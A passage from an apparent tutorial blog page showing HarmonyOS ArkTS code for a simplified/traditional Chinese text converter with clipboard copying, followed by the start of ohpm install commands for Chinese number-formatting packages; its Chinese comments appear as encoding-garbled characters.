class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">      .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">      .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseSpacing&#125;</span>lpx`</span> &#125;)</span><br><span class="line">      .<span class="title function_">alignItems</span>(<span class="title class_">HorizontalAlign</span>.<span class="property">Start</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">    .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#f2f3f5&quot;</span>); <span class="comment">// é¡µé¢èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="chinese"><a href="#chinese" class="headerlink" title="chinese"></a>chinese</h1><p>ohpm install @nutpi&#x2F;chinese_transverter</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// å¯¼å…¥å¿…è¦çš„è½¬æ¢åº“ï¼Œæä¾›ç®€ä½“ä¸ç¹ä½“ä¹‹é—´çš„è½¬æ¢åŠŸèƒ½</span></span><br><span class="line"><span class="keyword">import</span> &#123; transverter, <span class="title class_">TransverterType</span>, <span class="title class_">TransverterLanguage</span> &#125; <span class="keyword">from</span> <span class="string">&quot;@nutpi/chinese_transverter&quot;</span>;</span><br><span class="line"><span class="comment">// å¯¼å…¥å‰ªè´´æ¿æœåŠ¡ï¼Œç”¨äºå°†æ–‡æœ¬å¤åˆ¶åˆ°ç³»ç»Ÿå‰ªè´´æ¿</span></span><br><span class="line"><span class="keyword">import</span> &#123; pasteboard &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.BasicServicesKit&#x27;</span>;</span><br><span class="line"><span class="comment">// å¯¼å…¥æç¤ºæœåŠ¡ï¼Œç”¨äºå‘ç”¨æˆ·æ˜¾ç¤ºæ¶ˆæ¯</span></span><br><span class="line"><span class="keyword">import</span> &#123; promptAction &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.ArkUI&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ä½¿ç”¨@Entryè£…é¥°å™¨æ ‡è®°æ­¤ç»„ä»¶ä¸ºåº”ç”¨çš„å…¥å£ç‚¹</span></span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">  <span class="comment">// ä½¿ç”¨@Componentè£…é¥°å™¨å®šä¹‰ä¸€ä¸ªåä¸ºSimplifiedTraditionalConverterçš„ç»„ä»¶</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">SimplifiedTraditionalConverter</span> &#123;</span><br><span class="line">  <span class="comment">// å®šä¹‰çŠ¶æ€å˜é‡inputTextï¼Œå­˜å‚¨ç”¨æˆ·è¾“å…¥çš„åŸå§‹æ–‡æœ¬ï¼Œå½“å…¶å€¼å˜åŒ–æ—¶è§¦å‘onInputTextChangedæ–¹æ³•</span></span><br><span class="line">  @<span class="title class_">State</span> @<span class="title class_">Watch</span>(<span class="string">&#x27;onInputTextChanged&#x27;</span>) <span class="attr">inputText</span>: string = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="comment">// å®šä¹‰çŠ¶æ€å˜é‡simplifiedResultï¼Œå­˜å‚¨è½¬æ¢åçš„ç®€ä½“ç»“æœ</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">simplifiedResult</span>: string = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="comment">// å®šä¹‰çŠ¶æ€å˜é‡traditionalResultï¼Œå­˜å‚¨è½¬æ¢åçš„ç¹ä½“ç»“æœ</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">traditionalResult</span>: string = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="comment">// å®šä¹‰çŠ¶æ€å˜é‡isInputFocusedï¼Œè¡¨ç¤ºè¾“å…¥æ¡†æ˜¯å¦è·å¾—äº†ç„¦ç‚¹</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">isInputFocused</span>: boolean = <span class="literal">false</span>;</span><br><span class="line">  <span class="comment">// å®šä¹‰ä¸»é¢˜é¢œè‰²</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">themeColor</span>: string = <span class="string">&#x27;#439fff&#x27;</span>;</span><br><span class="line">  <span class="comment">// å®šä¹‰æ–‡æœ¬é¢œè‰²</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">textColor</span>: string = <span class="string">&quot;#2e2e2e&quot;</span>;</span><br><span class="line">  <span class="comment">// å®šä¹‰åŸºç¡€å†…è¾¹è·å¤§å°</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">basePadding</span>: number = <span class="number">30</span>;</span><br><span class="line">  <span class="comment">// å®šä¹‰æœ€å°æ–‡æœ¬åŒºåŸŸé«˜åº¦</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">minTextAreaHeight</span>: number = <span class="number">50</span>;</span><br><span class="line">  <span class="comment">// å®šä¹‰æœ€å¤§æ–‡æœ¬åŒºåŸŸé«˜åº¦</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">maxTextAreaHeight</span>: number = <span class="number">300</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// å½“inputTextçŠ¶æ€æ”¹å˜æ—¶è§¦å‘çš„æ–¹æ³•ï¼Œç”¨äºæ›´æ–°è½¬æ¢ç»“æœ</span></span><br><span class="line">  <span class="title function_">onInputTextChanged</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// å°†inputTextè½¬æ¢ä¸ºç®€ä½“ï¼Œå¹¶æ›´æ–°simplifiedResult</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">simplifiedResult</span> = <span class="title function_">transverter</span>(&#123;</span><br><span class="line">      <span class="attr">type</span>: <span class="title class_">TransverterType</span>.<span class="property">SIMPLIFIED</span>,</span><br><span class="line">      <span class="attr">str</span>: <span class="variable language_">this</span>.<span class="property">inputText</span>,</span><br><span class="line">      <span class="attr">language</span>: <span class="title class_">TransverterLanguage</span>.<span class="property">ZH_CN</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// å°†inputTextè½¬æ¢ä¸ºç¹ä½“ï¼Œå¹¶æ›´æ–°traditionalResult</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">traditionalResult</span> = <span class="title function_">transverter</span>(&#123;</span><br><span class="line">      <span class="attr">type</span>: <span class="title class_">TransverterType</span>.<span class="property">TRADITIONAL</span>,</span><br><span class="line">      <span class="attr">str</span>: <span class="variable language_">this</span>.<span class="property">inputText</span>,</span><br><span class="line">      <span class="attr">language</span>: <span class="title class_">TransverterLanguage</span>.<span class="property">ZH_CN</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// å°†ç»™å®šçš„æ–‡æœ¬å¤åˆ¶åˆ°å‰ªè´´æ¿ï¼Œå¹¶æ˜¾ç¤ºæç¤ºä¿¡æ¯</span></span><br><span class="line">  private <span class="title function_">copyToClipboard</span>(<span class="attr">text</span>: string): <span class="keyword">void</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> clipboardData = pasteboard.<span class="title function_">createData</span>(pasteboard.<span class="property">MIMETYPE_TEXT_PLAIN</span>, text); <span class="comment">// åˆ›å»ºå‰ªè´´æ¿æ•°æ®</span></span><br><span class="line">    <span class="keyword">const</span> systemClipboard = pasteboard.<span class="title function_">getSystemPasteboard</span>(); <span class="comment">// è·å–ç³»ç»Ÿå‰ªè´´æ¿</span></span><br><span class="line">    systemClipboard.<span class="title function_">setData</span>(clipboardData); <span class="comment">// è®¾ç½®å‰ªè´´æ¿æ•°æ®</span></span><br><span class="line">    promptAction.<span class="title function_">showToast</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;å·²å¤åˆ¶åˆ°å‰ªè´´æ¿&#x27;</span> &#125;); <span class="comment">// æ˜¾ç¤ºå¤åˆ¶æˆåŠŸçš„æç¤º</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ„å»ºç»„ä»¶çš„UI</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Scroll</span>() &#123; <span class="comment">// åˆ›å»ºå¯æ»šåŠ¨çš„å®¹å™¨</span></span><br><span class="line">      <span class="title class_">Column</span>() &#123; <span class="comment">// åœ¨æ»šåŠ¨å®¹å™¨ä¸­åˆ›å»ºå‚ç›´å¸ƒå±€</span></span><br><span class="line">        <span class="comment">// åˆ›å»ºæ ‡é¢˜æ–‡æœ¬</span></span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">&quot;ç®€ä½“ç¹ä½“è½¬æ¢å™¨&quot;</span>)</span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">          .<span class="title function_">height</span>(<span class="number">54</span>)</span><br><span class="line">          .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">          .<span class="title function_">fontWeight</span>(<span class="number">600</span>)</span><br><span class="line">          .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">          .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)</span><br><span class="line">          .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// åˆ›å»ºç”¨æˆ·è¾“å…¥åŒºåŸŸ</span></span><br><span class="line">        <span class="title class_">Column</span>() &#123;</span><br><span class="line">          <span class="comment">// åˆ›å»ºå¤šè¡Œæ–‡æœ¬è¾“å…¥æ¡†</span></span><br><span class="line">          <span class="title class_">TextArea</span>(&#123; <span class="attr">text</span>: $$this.<span class="property">inputText</span>, <span class="attr">placeholder</span>: <span class="string">&#x27;è¯·è¾“å…¥ç®€ä½“/ç¹ä½“å­—ï¼ˆæ”¯æŒæ··åˆè¾“å…¥ï¼‰&#x27;</span> &#125;)</span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">            .<span class="title function_">placeholderColor</span>(<span class="variable language_">this</span>.<span class="property">isInputFocused</span> ? <span class="variable language_">this</span>.<span class="property">themeColor</span> : <span class="title class_">Color</span>.<span class="property">Gray</span>)</span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">isInputFocused</span> ? <span class="variable language_">this</span>.<span class="property">themeColor</span> : <span class="variable language_">this</span>.<span class="property">textColor</span>)</span><br><span class="line">            .<span class="title function_">borderColor</span>(<span class="variable language_">this</span>.<span class="property">isInputFocused</span> ? <span class="variable language_">this</span>.<span class="property">themeColor</span> : <span class="title class_">Color</span>.<span class="property">Gray</span>)</span><br><span class="line">            .<span class="title function_">caretColor</span>(<span class="variable language_">this</span>.<span class="property">themeColor</span>)</span><br><span class="line">            .<span class="title function_">onBlur</span>(<span class="function">() =&gt;</span> <span class="variable language_">this</span>.<span class="property">isInputFocused</span> = <span class="literal">false</span>) <span class="comment">// å½“è¾“å…¥æ¡†å¤±å»ç„¦ç‚¹æ—¶ï¼Œæ›´æ–°isInputFocusedçŠ¶æ€</span></span><br><span class="line">            .<span class="title function_">onFocus</span>(<span class="function">() =&gt;</span> <span class="variable language_">this</span>.<span class="property">isInputFocused</span> = <span class="literal">true</span>) <span class="comment">// å½“è¾“å…¥æ¡†è·å¾—ç„¦ç‚¹æ—¶ï¼Œæ›´æ–°isInputFocusedçŠ¶æ€</span></span><br><span class="line">            .<span class="title function_">borderWidth</span>(<span class="number">1</span>)</span><br><span class="line">            .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">            .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">            .<span class="title function_">constraintSize</span>(&#123; <span class="attr">minHeight</span>: <span class="variable language_">this</span>.<span class="property">minTextAreaHeight</span>, <span class="attr">maxHeight</span>: <span class="variable language_">this</span>.<span class="property">maxTextAreaHeight</span> &#125;);</span><br><span class="line"> </span><br><span class="line">          <span class="comment">// åˆ›å»ºæ¸…ç©ºæŒ‰é’®</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">&#x27;æ¸…ç©º&#x27;</span>)</span><br><span class="line">            .<span class="title function_">borderWidth</span>(<span class="number">1</span>)</span><br><span class="line">            .<span class="title function_">borderColor</span>(<span class="variable language_">this</span>.<span class="property">themeColor</span>)</span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">themeColor</span>)</span><br><span class="line">            .<span class="title function_">height</span>(<span class="number">50</span>)</span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)</span><br><span class="line">            .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="number">650</span> - <span class="variable language_">this</span>.basePadding * <span class="number">2</span>&#125;</span>lpx`</span>)</span><br><span class="line">            .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span> &#125;)</span><br><span class="line">            .<span class="title function_">clickEffect</span>(&#123; <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">HEAVY</span>, <span class="attr">scale</span>: <span class="number">0.8</span> &#125;) <span class="comment">// æ·»åŠ ç‚¹å‡»æ•ˆæœ</span></span><br><span class="line">            .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> <span class="variable language_">this</span>.<span class="property">inputText</span> = <span class="string">&quot;&quot;</span>); <span class="comment">// æ¸…ç©ºè¾“å…¥æ¡†</span></span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">&#x27;650lpx&#x27;</span>)</span><br><span class="line">        .<span class="title function_">padding</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span>)</span><br><span class="line">        .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="number">20</span> &#125;)</span><br><span class="line">        .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">        .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">        .<span class="title function_">alignItems</span>(<span class="title class_">HorizontalAlign</span>.<span class="property">Start</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// åˆ›å»ºç¹ä½“ç»“æœå±•ç¤ºä¸å¤åˆ¶åŒºåŸŸ</span></span><br><span class="line">        <span class="title class_">Column</span>() &#123;</span><br><span class="line">          <span class="comment">// åˆ›å»ºç¹ä½“ç»“æœæ ‡é¢˜</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`ç¹ä½“ç»“æœï¼š`</span>)</span><br><span class="line">            .<span class="title function_">fontWeight</span>(<span class="number">600</span>)</span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>);</span><br><span class="line"> </span><br><span class="line">          <span class="comment">// åˆ›å»ºç¹ä½“ç»“æœå±•ç¤ºæ–‡æœ¬</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.traditionalResult&#125;</span>`</span>)</span><br><span class="line">            .<span class="title function_">constraintSize</span>(&#123; <span class="attr">minHeight</span>: <span class="variable language_">this</span>.<span class="property">minTextAreaHeight</span>, <span class="attr">maxHeight</span>: <span class="variable language_">this</span>.<span class="property">maxTextAreaHeight</span> &#125;)</span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">themeColor</span>)</span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Start</span>)</span><br><span class="line">            .<span class="title function_">copyOption</span>(<span class="title class_">CopyOptions</span>.<span class="property">InApp</span>)</span><br><span class="line">            .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding / <span class="number">3</span>&#125;</span>lpx`</span> &#125;);</span><br><span class="line"> </span><br><span class="line">          <span class="comment">// åˆ›å»ºå¤åˆ¶ç¹ä½“ç»“æœæŒ‰é’®</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">&#x27;å¤åˆ¶&#x27;</span>)</span><br><span class="line">            .<span class="title function_">enabled</span>(<span class="variable language_">this</span>.<span class="property">traditionalResult</span> ? <span class="literal">true</span> : <span class="literal">false</span>) <span class="comment">// åªæœ‰å½“æœ‰ç¹ä½“ç»“æœæ—¶ï¼ŒæŒ‰é’®æ‰å¯ç”¨</span></span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">            .<span class="title function_">backgroundColor</span>(<span class="variable language_">this</span>.<span class="property">themeColor</span>)</span><br><span class="line">            .<span class="title function_">height</span>(<span class="number">50</span>)</span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)</span><br><span class="line">            .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="number">650</span> - <span class="variable language_">this</span>.basePadding * <span class="number">2</span>&#125;</span>lpx`</span>)</span><br><span class="line">            .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span> &#125;)</span><br><span class="line">            .<span class="title function_">clickEffect</span>(&#123; <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">HEAVY</span>, <span class="attr">scale</span>: <span class="number">0.8</span> &#125;)</span><br><span class="line">            .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> <span class="variable language_">this</span>.<span class="title function_">copyToClipboard</span>(<span class="variable language_">this</span>.<span class="property">traditionalResult</span>)); <span class="comment">// å¤åˆ¶ç¹ä½“ç»“æœåˆ°å‰ªè´´æ¿</span></span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">&#x27;650lpx&#x27;</span>)</span><br><span class="line">        .<span class="title function_">padding</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span>)</span><br><span class="line">        .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">        .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">        .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span> &#125;)</span><br><span class="line">        .<span class="title function_">alignItems</span>(<span class="title class_">HorizontalAlign</span>.<span class="property">Start</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// åˆ›å»ºç®€ä½“ç»“æœå±•ç¤ºä¸å¤åˆ¶åŒºåŸŸ</span></span><br><span class="line">        <span class="title class_">Column</span>() &#123;</span><br><span class="line">          <span class="comment">// åˆ›å»ºç®€ä½“ç»“æœæ ‡é¢˜</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`ç®€ä½“ç»“æœï¼š`</span>)</span><br><span class="line">            .<span class="title function_">fontWeight</span>(<span class="number">600</span>)</span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">textColor</span>);</span><br><span class="line"> </span><br><span class="line">          <span class="comment">// åˆ›å»ºç®€ä½“ç»“æœå±•ç¤ºæ–‡æœ¬</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.simplifiedResult&#125;</span>`</span>)</span><br><span class="line">            .<span class="title function_">constraintSize</span>(&#123; <span class="attr">minHeight</span>: <span class="variable language_">this</span>.<span class="property">minTextAreaHeight</span>, <span class="attr">maxHeight</span>: <span class="variable language_">this</span>.<span class="property">maxTextAreaHeight</span> &#125;)</span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="variable language_">this</span>.<span class="property">themeColor</span>)</span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Start</span>)</span><br><span class="line">            .<span class="title function_">copyOption</span>(<span class="title class_">CopyOptions</span>.<span class="property">InApp</span>)</span><br><span class="line">            .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding / <span class="number">3</span>&#125;</span>lpx`</span> &#125;);</span><br><span class="line"> </span><br><span class="line">          <span class="comment">// åˆ›å»ºå¤åˆ¶ç®€ä½“ç»“æœæŒ‰é’®</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">&#x27;å¤åˆ¶&#x27;</span>)</span><br><span class="line">            .<span class="title function_">enabled</span>(<span class="variable language_">this</span>.<span class="property">simplifiedResult</span> ? <span class="literal">true</span> : <span class="literal">false</span>) <span class="comment">// åªæœ‰å½“æœ‰ç®€ä½“ç»“æœæ—¶ï¼ŒæŒ‰é’®æ‰å¯ç”¨</span></span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">            .<span class="title function_">backgroundColor</span>(<span class="variable language_">this</span>.<span class="property">themeColor</span>)</span><br><span class="line">            .<span class="title function_">height</span>(<span class="number">50</span>)</span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)</span><br><span class="line">            .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="number">18</span>)</span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="number">650</span> - <span class="variable language_">this</span>.basePadding * <span class="number">2</span>&#125;</span>lpx`</span>)</span><br><span class="line">            .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span> &#125;)</span><br><span class="line">            .<span class="title function_">clickEffect</span>(&#123; <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">HEAVY</span>, <span class="attr">scale</span>: <span class="number">0.8</span> &#125;)</span><br><span class="line">            .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> <span class="variable language_">this</span>.<span class="title function_">copyToClipboard</span>(<span class="variable language_">this</span>.<span class="property">simplifiedResult</span>)); <span class="comment">// å¤åˆ¶ç®€ä½“ç»“æœåˆ°å‰ªè´´æ¿</span></span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">&#x27;650lpx&#x27;</span>)</span><br><span class="line">        .<span class="title function_">padding</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span>)</span><br><span class="line">        .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">        .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">        .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span> &#125;)</span><br><span class="line">        .<span class="title function_">alignItems</span>(<span class="title class_">HorizontalAlign</span>.<span class="property">Start</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">    .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">    .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#f2f3f5&quot;</span>)</span><br><span class="line">    .<span class="title function_">align</span>(<span class="title class_">Alignment</span>.<span class="property">Top</span>)</span><br><span class="line">    .<span class="title function_">padding</span>(&#123; <span class="attr">bottom</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.basePadding&#125;</span>lpx`</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Up-Lower"><a href="#Up-Lower" class="headerlink" title="Up Lower"></a>Up Lower</h1><p>æ•°å­—è½¬ä¸­æ–‡å¤§å°å†™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ohpm install @nutpi/chinese-finance-number</span><br><span class="line">ohpm install 